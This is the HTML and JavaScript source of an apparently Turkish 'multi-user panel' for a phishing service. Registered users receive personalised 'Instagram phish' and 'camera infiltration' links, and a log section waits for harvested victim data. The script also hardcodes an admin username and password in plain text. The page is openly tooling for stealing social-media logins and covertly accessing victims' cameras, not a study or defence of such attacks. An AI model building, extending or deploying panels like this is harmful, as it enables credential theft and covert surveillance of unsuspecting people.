<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AFAVAN66 - Multi-User Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #050505; --neon: #00d4ff; --green: #39ff14; --border: #1a1a1a; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
        body { background: var(--bg); color: white; min-height: 100vh; }

        /* GİRİŞ EKRANI */
        #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .auth-card { width: 90%; max-width: 380px; background: #0d0d0d; border: 1px solid var(--border); padding: 25px; border-radius: 12px; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 12px; }
        .tab.active { color: var(--neon); border-bottom: 2px solid var(--neon); }
        input { width: 100%; background: #000; border: 1px solid #222; padding: 14px; color: white; outline: none; border-radius: 6px; margin-bottom: 12px; }
        .btn { width: 100%; background: var(--neon); color: black; padding: 15px; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; }

        /* ANA PANEL */
        #main-panel { display: none; padding: 80px 15px 40px; max-width: 500px; margin: 0 auto; }
        header { position: fixed; top: 0; left: 0; width: 100%; height: 60px; background: #0a0a0a; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000; }
        
        .user-info { font-size: 10px; text-align: right; }
        .tool-box { background: #0d0d0d; border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .link-area { background: #000; border: 1px dashed #333; padding: 12px; font-size: 10px; color: var(--green); word-break: break-all; margin-top: 10px; border-radius: 4px; }
        .badge { background: var(--neon); color: black; font-size: 9px; padding: 2px 6px; font-weight: bold; border-radius: 3px; margin-bottom: 10px; display: inline-block; }
    </style>
</head>
<body>

    <div id="auth-screen">
        <div class="auth-card">
            <h2 style="text-align: center; color: var(--neon); margin-bottom: 15px;">AFAVAN66 NETWORK</h2>
            <div class="tabs">
                <div class="tab active" onclick="setMode('login')">GİRİŞ</div>
                <div class="tab" onclick="setMode('reg')">KAYIT OL</div>
            </div>
            <input type="text" id="username" placeholder="Kullanıcı Adı">
            <input type="password" id="password" placeholder="Şifre">
            <button class="btn" onclick="process()">SİSTEME GİRİŞ</button>
            <p id="msg" style="color:red; font-size:10px; text-align:center; margin-top:10px;"></p>
        </div>
    </div>

    <div id="main-panel">
        <header>
            <div style="color:var(--neon); font-weight:bold;">AFAVAN66 V3</div>
            <div class="user-info">
                <span id="display-user" style="color:var(--green)"></span><br>
                <span id="display-id" style="color:#555"></span>
            </div>
        </header>

        <div class="tool-box">
            <span class="badge">KAMERA SIZMA</span>
            <p style="font-size:11px; color:#666;">Size özel üretim sızma linki:</p>
            <div class="link-area" id="cam-link"></div>
            <button class="btn" style="margin-top:10px; padding:10px;" onclick="copy('cam-link')">ÖZEL LİNKİ KOPYALA</button>
        </div>

        <div class="tool-box">
            <span class="badge" style="background:#e1306c; color:white;">INSTAGRAM PHISH</span>
            <p style="font-size:11px; color:#666;">Size özel phishing linki:</p>
            <div class="link-area" id="ig-link"></div>
            <button class="btn" style="margin-top:10px; padding:10px; background:#e1306c; color:white;" onclick="copy('ig-link')">ÖZEL LİNKİ KOPYALA</button>
        </div>

        <div style="font-size:12px; color:var(--green); font-weight:bold; margin-top:30px;">📥 SİZE ÖZEL GELEN VERİLER</div>
        <div id="logs" style="margin-top:15px; font-size:11px; color:#444; text-align:center; padding:30px; border:1px solid #111;">
            Henüz size özel bir veri girişi olmadı.
        </div>
    </div>

    <script>
        let mode = 'login';
        // Tarayıcı hafızasındaki kullanıcıları al
        let users = JSON.parse(localStorage.getItem('afa_users')) || {};

        function setMode(m) { mode = m; document.getElementById('msg').innerText = ""; }

        function process() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            const msg = document.getElementById('msg');

            if(!u || !p) return msg.innerText = "Alanları doldurun!";

            if(mode === 'reg') {
                if(users[u]) return msg.innerText = "Bu kullanıcı adı alınmış!";
                // Yeni kullanıcıya benzersiz ID oluştur (Örn: afa-5829)
                const uid = "afa-" + Math.floor(1000 + Math.random() * 9000);
                users[u] = { pass: p, id: uid };
                localStorage.setItem('afa_users', JSON.stringify(users));
                alert("Kayıt başarılı! Giriş yapabilirsiniz. ID'niz: " + uid);
            } else {
                // Admin Girişi (Sana Özel)
                if(u === "afavan66" && p === "Efecan1903") {
                    startPanel("ADMİN", "ROOT-001");
                } 
                else if(users[u] && users[u].pass === p) {
                    startPanel(u, users[u].id);
                } else {
                    msg.innerText = "Hatalı kullanıcı adı veya şifre!";
                }
            }
        }

        function startPanel(user, id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-panel').style.display = 'block';
            document.getElementById('display-user').innerText = user.toUpperCase();
            document.getElementById('display-id').innerText = "ID: " + id;
            
            // Linkleri kullanıcıya özel oluştur
            const base = "https://afavan-secure-panel.github.io";
            document.getElementById('cam-link').innerText = `${base}/camera?ref=${id}`;
            document.getElementById('ig-link').innerText = `${base}/instagram?ref=${id}`;
        }

        function copy(id) {
            const t = document.getElementById(id).innerText;
            navigator.clipboard.writeText(t);
            alert("Size özel link kopyalandı!");
        }
    </script>
</body>
</html>
